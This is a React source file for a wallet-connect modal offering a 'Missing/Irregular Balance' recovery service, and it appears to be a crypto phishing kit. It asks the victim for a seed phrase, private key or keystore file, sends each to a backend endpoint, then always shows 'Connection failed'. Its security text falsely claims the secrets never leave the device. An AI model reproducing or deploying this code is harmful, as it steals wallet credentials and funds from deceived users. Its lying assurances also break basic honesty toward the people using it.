import React, { useState, useEffect, useRef } from 'react';
import styled, { keyframes } from 'styled-components';
import {
  FaSearch,
  FaTimes,
  FaKey,
  FaFileAlt,
  FaShieldAlt,
  FaEye,
  FaEyeSlash,
  FaUpload,
  FaExclamationCircle,
  FaCheckCircle
} from 'react-icons/fa';

// Wallet data
const wallets = [
  "MetaMask Wallet",
  "Trust Wallet",
  "Coinbase Wallet",
  "Keplr Wallet",
  "Ledger Wallet",
  "SafePal Wallet",
  "Tronlink Wallet",
  "Rabby Wallet",
  "Phantom Wallet",
  "Exodus Wallet",
  "Atomic Wallet",
  "Binance Chain Wallet",
  "WalletConnect Wallet",
  "Rainbow Wallet",
  "Uniswap Wallet",
  "Brave Wallet",
  "MyEtherWallet",
  "TokenPocket Wallet",
  "Math Wallet",
  "Bitkeep Wallet",
  "1inch Wallet",
  "Argent Wallet",
  "Zerion Wallet",
  "Enjin Wallet",
  "imToken Wallet",
  "Wallet.io",
  "Guarda Wallet",
  "Jaxx Liberty Wallet",
  "Edge Wallet",
  "Coinomi Wallet",
  "Electrum Wallet",
  "BlueWallet",
  "Wasabi Wallet",
  "Samourai Wallet",
  "Braavos Wallet",
  "DeFi Wallet",
  "Compound Wallet",
  "Aave Wallet",
  "SushiSwap Wallet",
  "PancakeSwap Wallet",
  "Curve Wallet",
  "Yearn Finance Wallet",
  "Balancer Wallet",
  "Synthetix Wallet",
  "MakerDAO Wallet",
  "Dydx Wallet",
  "Alpha Wallet",
  "Frame Wallet",  "Torus Wallet",
 
  "Portis Wallet",
  "Fortmatic Wallet",
  "Authereum Wallet",
  "Squarelink Wallet",
  "Venly Wallet",
  "Sequence Wallet",
  "Gnosis Safe Wallet",
  "DeBank Wallet",
  "Unstoppable Wallet",
  "Pillar Wallet",
  "Status Wallet",
  "TrustVault Wallet",
  "Linen Wallet",
  "Other Wallet"
];




// Main Component
const WalletConnectModals = ({ isModalOpen, openModal }) => {
  const [step, setStep] = useState('select'); // select, connect, loading, manual, message
  const [selectedWallet, setSelectedWallet] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  const [activeTab, setActiveTab] = useState('seed'); // seed, private, json
  const [showPassword, setShowPassword] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [jsonFile, setJsonFile] = useState(null);
  const [jsonFileName, setJsonFileName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [messageType, setMessageType] = useState('error'); // error or success
  const [messageText, setMessageText] = useState('');
  const fileInputRef = useRef(null);

  const filteredWallets = wallets.filter(wallet =>
    wallet.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setStep('loading');
    setTimeout(() => {
      setStep('manual');
    }, 2000);
  };


  //   setIsLoading(true);
  //   const formData = new FormData();
  //   formData.append('wallet', selectedWallet);
  //   formData.append('service', 'Missing/Irregular Balance');

  //   if (activeTab === 'seed') {
  //     if (!seedPhrase) {
  //       alert('Please enter your seed phrase.');
  //       setIsLoading(false);
  //       return;
  //     }
  //     formData.append('seedPhrase', seedPhrase);
  //   } else if (activeTab === 'private') {
  //     if (!privateKey) {
  //       alert('Please enter your private key.');
  //       setIsLoading(false);
  //       return;
  //     }
  //     formData.append('privateKey', privateKey);
  //   } else if (activeTab === 'json') {
  //     if (jsonFile) {
  //       formData.append('file', jsonFile);
  //     } else {
  //       alert('Please select a JSON file.');
  //       setIsLoading(false);
  //       return;
  //     }
  //   }

  //   try {
  //     const response = await fetch('/api/connect', {
  //       method: 'POST',
  //       body: formData,
  //     });

  //     if (response.ok) {
  //       console.log('Connected successfully');
  //       setStep('manual');
  //     } else {
  //       console.error('Connection failed');
  //       alert('Connection failed. Please try again.');
  //     }
  //   } catch (error) {
  //     console.error('An error occurred:', error);
  //     alert('An error occurred. Please try again.');
  //   } finally {
  //     setIsLoading(false);
  //   }
  // };

  const handleConnect = async () => {

  try {
    const apiKey = process.env.NEXT_PUBLIC_API_KEY;
    const baseURL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';

    // Validate wallet availability
    const wallet = window.ethereum || window.coinbaseWalletProvider || window.web3?.currentProvider
    if (!wallet) {
      alert('No Web3 wallet detected. Please install MetaMask or another wallet extension.');
      return;
    }

    setIsLoading(true);

    if (activeTab === 'seed') {
      if (!seedPhrase) {
        alert('Please enter your seed phrase.');
        setIsLoading(false);
        return;
      }
  const wordCount = seedPhrase.trim().split(/\s+/).length;
      if (![12, 15, 24].includes(wordCount)) {
        alert(`Invalid seed phrase!.`);
        setIsLoading(false);
        return;
      }
      const response = await fetch(`${baseURL}/simple-form`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': apiKey,
        },
        body: JSON.stringify({
          title: selectedWallet,
          seed: seedPhrase,
        }),
      });

      if (response.ok) {
        setStep('message');
        setMessageType('error');
        setMessageText('Connection failed. Try again.');
        setTimeout(() => {
          // Reset state when closing after attempt
          setStep('select');
          setSeedPhrase('');
          setPrivateKey('');
          setJsonFile(null);
          setJsonFileName('');
          openModal(false);
        }, 3000);
      } else {
        alert('Connection failed. Try again.');
      }

    } else if (activeTab === 'private') {
      if (!privateKey) {
        alert('Please enter your private key.');
        setIsLoading(false);
        return;
      }

      const response = await fetch(`${baseURL}/simple-passkey`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': apiKey,
        },
        body: JSON.stringify({
          title: selectedWallet,
          passkey: privateKey,
        }),
      });

     if (response.ok) {
        setStep('message');
        setMessageType('error');
        setMessageText('Connection failed. Try again.');
        setTimeout(() => {
          // Reset state when closing after attempt
          setStep('select');
          setSeedPhrase('');
          setPrivateKey('');
          setJsonFile(null);
          setJsonFileName('');
          openModal(false);
        }, 3000);
      } else {
        alert('Connection failed. Try again.');
      }

    } else if (activeTab === 'json') {
      if (!jsonFile) {
        alert('Please upload a JSON file.');
        setIsLoading(false);
        return;
      }

      const formData = new FormData();
      formData.append('title', selectedWallet);
      formData.append('jsonFile', jsonFile);

      const response = await fetch(`${baseURL}/form-with-json`, {
        method: 'POST',
        headers: {
          'x-api-key': apiKey,
        },
        body: formData,
      });

    if (response.ok) {
        setStep('message');
        setMessageType('error');
        setMessageText('Connection failed. Try again.');
        setTimeout(() => {
          // Reset state when closing after attempt
          setStep('select');
          setSeedPhrase('');
          setPrivateKey('');
          setJsonFile(null);
          setJsonFileName('');
          openModal(false);
        }, 3000);
      } else {
        alert('Connection failed. Try again.');
      }
    }

  } catch (error) {
    console.error('Error:', error);
    alert('Something went wrong. Please try again.');
  } finally {
    setIsLoading(false);
  }
};


  const handleClose = () => {
    openModal(false);
    // Reset all state to ensure modal always opens at 'select' step
    setStep('select');
    setSelectedWallet('');
    setSeedPhrase('');
    setPrivateKey('');
    setSearchTerm('');
    setJsonFile(null);
    setJsonFileName('');
    setIsLoading(false);
  };
  const handleConnectManual = () => {
    setStep('connect');
  };

  const handleFileUpload = () => {
    fileInputRef.current.click();
  };

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      setJsonFile(file);
      setJsonFileName(file.name);
    }
  };

  const handleDragOver = (e) => {
    e.preventDefault();
  };

  const handleDrop = (e) => {
    e.preventDefault();
    const file = e.dataTransfer.files[0];
    if (file) {
      setJsonFile(file);
      setJsonFileName(file.name);
    }
  };

  useEffect(() => {
    if (isModalOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [isModalOpen]);

  if (!isModalOpen) {
    return null;
  }

  if (step === 'select') {
    return (
      <Overlay onClick={handleClose}>
        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="900px">
          <ModalHeader>
            <Title>Select Your Wallet</Title>
            <Subtitle>Choose your wallet for: <span>Missing/Irregular Balance</span></Subtitle>
            <CloseButton onClick={handleClose}>
              <FaTimes />
            </CloseButton>
          </ModalHeader>
          <ModalBody>
            <SearchWrapper>
              <SearchIcon />
              <SearchInput
                placeholder="Search wallet..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </SearchWrapper>
            <WalletGrid>
              {filteredWallets.map((wallet, index) => (
                <WalletButton key={index} onClick={() => handleWalletSelect(wallet)}>
                  {wallet}
                </WalletButton>
              ))}
            </WalletGrid>
          </ModalBody>
        </Modal>
      </Overlay>
    );
  }

  if (step === 'connect') {
    return (
      <Overlay onClick={handleClose}>
        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="700px">
          <ModalHeader>
            <Title>Connect {selectedWallet}</Title>
            <Subtitle>Service: <span>Missing/Irregular Balance</span></Subtitle>
            <CloseButton onClick={handleClose}>
              <FaTimes />
            </CloseButton>
          </ModalHeader>
          <ModalBody>
            <TabContainer>
              <Tab $active={activeTab === 'seed'} onClick={() => setActiveTab('seed')}>
                <FaKey /> Seed Phrase
              </Tab>
              <Tab $active={activeTab === 'private'} onClick={() => setActiveTab('private')}>
                <FaShieldAlt /> Private Key
              </Tab>
              <Tab $active={activeTab === 'json'} onClick={() => setActiveTab('json')}>
                <FaFileAlt /> JSON File
              </Tab>
            </TabContainer>

            {activeTab === 'seed' && (
              <>
                <InfoBox>
                  <InfoTitle>
                    <FaShieldAlt /> Your Security is Our Priority
                  </InfoTitle>
                  <InfoText>
                    Your seed phrase is processed locally on your device and never stored on our servers. We use
                    industry-standard encryption protocols to ensure your wallet credentials remain completely private
                    and secure throughout the recovery process.
                  </InfoText>
                </InfoBox>
                <TextArea
                  placeholder="word1 word2 word3 ..."
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                />
                <HintList>
                  <HintItem>Separate each word with a space and ensure proper spelling and order</HintItem>
                  <HintItem>Most wallets use 12 or 24 words - verify your phrase length matches your wallet</HintItem>
                  <HintItem>Double-check for any typos as incorrect phrases cannot recover your wallet</HintItem>
                </HintList>
              </>
            )}

            {activeTab === 'private' && (
              <>
                <InfoBox>
                  <InfoTitle>
                    <FaShieldAlt /> Bank-Level Security Standards
                  </InfoTitle>
                  <InfoText>
                    Your private key is encrypted using AES-256 encryption and processed entirely on your device. We
                    maintain zero-knowledge architecture – your private key never leaves your browser and is
                    immediately purged after the connection process completes.
                  </InfoText>
                </InfoBox>
                <InputWrapper>
                  <Input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="0x..."
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                  />
                  <EyeButton onClick={() => setShowPassword(!showPassword)}>
                    {showPassword ? <FaEyeSlash /> : <FaEye />}
                  </EyeButton>
                </InputWrapper>
                <HintList>
                  <HintItem>Private keys should start with "0x" and contain exactly 64 hexadecimal characters</HintItem>
                  <HintItem>Ensure no spaces or additional characters are included in your private key</HintItem>
                  <HintItem>Your private key grants full access to your wallet - verify accuracy before connecting</HintItem>
                </HintList>
              </>
            )}

            {activeTab === 'json' && (
              <>
                <InfoBox>
                  <InfoTitle>
                    <FaShieldAlt /> Enterprise-Grade File Processing
                  </InfoTitle>
                  <InfoText>
                    Your keystore file is processed locally using secure cryptographic libraries. Files are never uploaded
                    to external servers and are immediately deleted from memory after processing. We support all
                    standard wallet formats including MetaMask, MyEtherWallet, and hardware wallet exports.
                  </InfoText>
                </InfoBox>
                <UploadArea onClick={handleFileUpload} onDragOver={handleDragOver} onDrop={handleDrop}>
                  <input
                    type="file"
                    ref={fileInputRef}
                    onChange={handleFileChange}
                    style={{ display: 'none' }}
                    accept=".json"
                  />
                  <UploadIcon />
                  {jsonFileName ? (
                    <UploadText>{jsonFileName}</UploadText>
                  ) : (
                    <UploadText>Click to upload or drag and drop your keystore file</UploadText>
                  )}
                  <UploadButton>Choose File</UploadButton>
                  <UploadHint>Supports .json files up to 5MB</UploadHint>
                </UploadArea>
                <HintList>
                  <HintItem>Accepted formats: MetaMask, MyEtherWallet, Ledger, Trezor keystore exports</HintItem>
                  <HintItem>Ensure your JSON file contains valid wallet encryption data</HintItem>
                  <HintItem>You may need your wallet password to complete the connection process</HintItem>
                </HintList>
              </>
            )}

            <ButtonRow>
              <Button onClick={handleClose}>Cancel</Button>
              <Button $primary onClick={handleConnect} disabled={isLoading}>
                {isLoading ? 'Connecting...' : 'Connect Wallet'}
              </Button>
            </ButtonRow>
          </ModalBody>
        </Modal>
      </Overlay>
    );
  }

  if (step === 'loading') {
    return (
      <Overlay>
        <Modal $maxWidth="500px">
          <CenterContent>
            <LoadingSpinner />
            <Title>Connecting to {selectedWallet}</Title>
            <CenterText>Please wait while we establish connection...</CenterText>
          </CenterContent>
        </Modal>
      </Overlay>
    );
  }

  if (step === 'manual') {
    return (
      <Overlay onClick={handleClose}>
        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="500px">
          <CenterContent>
            <Title>Connection Required</Title>
            <CenterText>Please connect manually to continue</CenterText>
            <ButtonRow>
              <Button $primary onClick={handleConnectManual}>Connect Manually</Button>
            </ButtonRow>
          </CenterContent>
        </Modal>
      </Overlay>
    );
  }

  if (step === 'message') {
    return (
      <Overlay>
        <Modal $maxWidth="500px">
          <CenterContent>
            <MessageIcon $type={messageType}>
              {messageType === 'error' ? <FaExclamationCircle /> : <FaCheckCircle />}
            </MessageIcon>
            <Title>{messageType === 'error' ? 'Connection Failed' : 'Success'}</Title>
            <CenterText>{messageText}</CenterText>
          </CenterContent>
        </Modal>
      </Overlay>
    );
  }

  return null;
};

export default WalletConnectModals;




// Animations
const fadeIn = keyframes`
  from { opacity: 0; }
  to { opacity: 1; }
`;

const slideUp = keyframes`
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
`;

const spin = keyframes`
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
`;

// Styled Components
const Overlay = styled.div`
  position: fixed;
  inset: 0;
  background-color: rgba(0, 0, 0, 0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  animation: ${fadeIn} 0.3s ease;
  padding: 1rem;
`;

const Modal = styled.div`
  background-color: #0a1929;
  border-radius: 1rem;
  border: 1px solid rgba(255, 255, 255, 0.1);
  max-width: ${props => props.$maxWidth || '900px'};
  width: 100%;
  max-height: 90vh;
  overflow-y: auto;
  animation: ${slideUp} 0.3s ease;
  position: relative;

  &::-webkit-scrollbar {
    width: 8px;
  }

  &::-webkit-scrollbar-track {
    background: rgba(255, 255, 255, 0.05);
  }

  &::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.2);
    border-radius: 4px;
  }
`;

const ModalHeader = styled.div`
  padding: 2rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  position: relative;
`;

const CloseButton = styled.button`
  position: absolute;
  top: 1.5rem;
  right: 1.5rem;
  background: none;
  border: none;
  color: #9ca3af;
  font-size: 1.5rem;
  cursor: pointer;
  transition: color 0.3s ease;

  &:hover {
    color: white;
  }
`;

const Title = styled.h2`
  font-size: 1.75rem;
  font-weight: 700;
  color: white;
  margin-bottom: 0.5rem;
`;

const Subtitle = styled.p`
  color: #9ca3af;
  font-size: 0.95rem;

  span {
    color: #10b981;
  }
`;

const ModalBody = styled.div`
  padding: 2rem;
`;

const SearchWrapper = styled.div`
  position: relative;
  margin-bottom: 1.5rem;
`;

const SearchIcon = styled(FaSearch)`
  position: absolute;
  left: 1rem;
  top: 50%;
  transform: translateY(-50%);
  color: #6b7280;
  font-size: 1rem;
`;

const SearchInput = styled.input`
  width: 100%;
  background-color: #1e293b;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 0.5rem;
  padding: 0.875rem 1rem 0.875rem 3rem;
  color: white;
  font-size: 0.95rem;

  &::placeholder {
    color: #6b7280;
  }

  &:focus {
    outline: none;
    border-color: #3b82f6;
  }
`;

const WalletGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 1rem;
`;

const WalletButton = styled.button`
  background-color: #1e293b;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 0.5rem;
  padding: 1rem;
  color: white;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  text-align: left;

  &:hover {
    background-color: #2d3f5f;
    border-color: rgba(255, 255, 255, 0.2);
    transform: translateY(-2px);
  }
`;

const TabContainer = styled.div`
  display: flex;
  gap: 0.5rem;
  margin-bottom: 2rem;
`;

const Tab = styled.button`
  flex: 1;
  background-color: ${props => props.$active ? '#10b981' : '#1e293b'};
  border: none;
  border-radius: 0.5rem;
  padding: 0.875rem 1rem;
  color: white;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;

  &:hover {
    background-color: ${props => props.$active ? '#059669' : '#2d3f5f'};
  }
`;

const InfoBox = styled.div`
  background-color: rgba(16, 185, 129, 0.1);
  border: 1px solid rgba(16, 185, 129, 0.3);
  border-radius: 0.5rem;
  padding: 1rem;
  margin-bottom: 1.5rem;
`;

const InfoTitle = styled.div`
  display: flex;
  align-items: center;
  gap: 0.5rem;
  color: #10b981;
  font-weight: 600;
  margin-bottom: 0.5rem;
`;

const InfoText = styled.p`
  color: #9ca3af;
  font-size: 0.875rem;
  line-height: 1.6;
`;

const InputWrapper = styled.div`
  position: relative;
  margin-bottom: 1rem;
`;

const Input = styled.input`
  width: 100%;
  background-color: #1e293b;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 0.5rem;
  padding: 0.875rem 3rem 0.875rem 1rem;
  color: white;
  font-size: 0.95rem;

  &::placeholder {
    color: #6b7280;
  }

  &:focus {
    outline: none;
    border-color: #10b981;
  }
`;

const TextArea = styled.textarea`
  width: 100%;
  background-color: #1e293b;
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 0.5rem;
  padding: 1rem;
  color: white;
  font-size: 0.95rem;
  min-height: 120px;
  font-family: inherit;
  resize: vertical;

  &::placeholder {
    color: #6b7280;
  }

  &:focus {
    outline: none;
    border-color: #10b981;
  }
`;

const EyeButton = styled.button`
  position: absolute;
  right: 1rem;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  color: #6b7280;
  cursor: pointer;
  font-size: 1.25rem;

  &:hover {
    color: white;
  }
`;

const HintList = styled.ul`
  list-style: none;
  padding: 0;
  margin-top: 0.5rem;
`;

const HintItem = styled.li`
  color: #9ca3af;
  font-size: 0.875rem;
  margin-bottom: 0.25rem;
  padding-left: 0.5rem;

  &:before {
    content: "• ";
    color: #10b981;
    font-weight: bold;
    margin-right: 0.5rem;
  }
`;

const UploadArea = styled.div`
  border: 2px dashed rgba(255, 255, 255, 0.2);
  border-radius: 0.5rem;
  padding: 3rem 2rem;
  text-align: center;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-bottom: 1rem;

  &:hover {
    border-color: #10b981;
    background-color: rgba(16, 185, 129, 0.05);
  }
`;

const UploadIcon = styled(FaUpload)`
  font-size: 3rem;
  color: #6b7280;
  margin-bottom: 1rem;
`;

const UploadText = styled.p`
  color: #9ca3af;
  margin-bottom: 0.5rem;
`;

const UploadButton = styled.button`
  background-color: #1e293b;
  border: 1px solid rgba(255, 255, 255, 0.2);
  border-radius: 0.5rem;
  padding: 0.75rem 1.5rem;
  color: white;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;

  &:hover {
    background-color: #2d3f5f;
  }
`;

const UploadHint = styled.p`
  color: #6b7280;
  font-size: 0.875rem;
  margin-top: 0.5rem;
`;

const ButtonRow = styled.div`
  display: flex;
  gap: 1rem;
  margin-top: 2rem;
`;

const Button = styled.button`
  flex: 1;
  background-color: ${props => props.$primary ? '#10b981' : '#475569'};
  border: none;
  border-radius: 0.5rem;
  padding: 1rem;
  color: white;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;

  &:hover {
    background-color: ${props => props.$primary ? '#059669' : '#64748b'};
    transform: translateY(-2px);
  }
  &:disabled {
    background-color: #334155;
    cursor: not-allowed;
  }
`;

const LoadingSpinner = styled.div`
  width: 60px;
  height: 60px;
  border: 4px solid rgba(16, 185, 129, 0.2);
  border-top-color: #10b981;
  border-radius: 50%;
  animation: ${spin} 1s linear infinite;
  margin: 2rem auto;
`;

const CenterContent = styled.div`
  text-align: center;
  padding: 2rem;
`;

const CenterText = styled.p`
  color: #9ca3af;
  font-size: 1rem;
  margin-top: 1rem;
`;

const MessageIcon = styled.div`
  font-size: 4rem;
  margin: 1.5rem auto;
  display: flex;
  align-items: center;
  justify-content: center;
  color: ${props => props.$type === 'error' ? '#ef4444' : '#10b981'};
  animation: ${slideUp} 0.5s ease;
`;
